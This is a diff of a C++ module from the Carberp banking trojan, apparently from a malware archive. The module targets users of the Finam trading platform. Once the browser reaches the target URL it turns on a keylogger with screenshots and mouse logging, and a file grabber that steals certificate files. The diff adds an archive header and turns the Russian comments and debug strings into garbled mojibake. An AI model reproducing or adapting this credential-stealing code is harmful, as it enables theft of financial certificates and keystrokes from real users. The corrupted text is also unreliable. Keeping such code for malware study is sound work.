@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "finam.h"
 #include "GetApi.h"
 #include "KeyLogSystems.h"
@@ -21,7 +32,7 @@ namespace Finam
 static PKeyLogSystem System = 0;
 static bool finamActivated = false;
 
-//как только попадается хоть один файл с нужно маской, то сразу грабим всю папку и останавливаем файл граббер
+//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static int GrabKeyFiles( FileGrabber::ParamEvent* e )
 {
 	DBG( "finam", "File: %s", e->fileName );
@@ -37,14 +48,14 @@ static void WINAPI URLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
 		if( !finamActivated )
 		{
 			finamActivated = true;
-			DBG( "finam", "Активирована" );
+			DBG( "finam", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 			KeyLogger::ActivateSystem(System);
 			FileGrabber::Init(FileGrabber::CREATEFILEA);
 			FileGrabber::Receiver* rv = FileGrabber::CreateReceiver();
 			rv->FuncReceiver = GrabKeyFiles;
 			rv->minSize = 200;
 			rv->maxSize = 1000;
-			rv->maska = "*-BEGIN*-END*"; //файлы которые начинаются с BEGIN CERTIFICATE и заканчиваются END CERTIFICATE
+			rv->maska = "*-BEGIN*-END*"; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ BEGIN CERTIFICATE пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ END CERTIFICATE
 			FileGrabber::AddReceiver(rv);
 		}
 	}
@@ -54,7 +65,7 @@ static void WINAPI URLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
 			finamActivated = false;
 			FileGrabber::Release();
 			KeyLogger::CloseSession();
-			DBG( "finam", "Деактивирована" );
+			DBG( "finam", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		}
 }
 
@@ -67,7 +78,7 @@ bool Init()
 		System->MakeScreenShot = true;;
 		System->NotAutoStart = true;
 		System->AlwaysLogMouse = LOG_MOUSE_NOT_SCREENSHOT;
-		DBG( "finam", "Ожидаем нужный урл" );
+		DBG( "finam", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ" );
 		KeyLogger::ConnectEventHandler( KLE_IE_URL_CHANGED, URLChanged );
 		return true;
 	}
